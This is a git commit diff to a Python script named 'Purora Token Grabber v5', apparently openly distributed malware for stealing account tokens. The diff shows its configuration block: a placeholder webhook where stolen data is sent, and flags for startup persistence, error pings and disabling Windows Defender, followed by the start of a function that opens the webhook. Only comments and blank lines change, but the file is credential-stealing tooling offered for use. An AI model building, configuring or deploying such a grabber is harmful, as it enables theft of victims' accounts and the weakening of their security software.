77d936f3bf7887f92ba3cc1884e227ec61ff2768
Purora <117518751+Purora@users.noreply.github.com>
2022-12-14 16:22:57 +0100

    Update Purora Token Grabber v5.py

--- Purora Token Grabber v5.py
+++ Purora Token Grabber v5.py
@@ -21,16 +21,22 @@ from sys import argv
 from tempfile import gettempdir, mkdtemp
 from zipfile import ZIP_DEFLATED, ZipFile
 
-
 # //////////////////////////////////////////////////////////////////////
 __HOOK__ = "YOUR WEBHOOK HERE"
 # //////////////////////////////////////////////////////////////////////
 
+
+
+
+# DONT TOUCH THIS OPTIONS COZ THEY ARE NOT WORKING YET
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 __ERROR__ = "%_error_enabled%"
 __STARTUP__ = "%_startup_enabled%"
 __DEFENDER__ = "%_defender_enabled%"
+# DONT TOUCH THIS OPTIONS COZ THEY ARE NOT WORKING YET
+
+
 
 def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
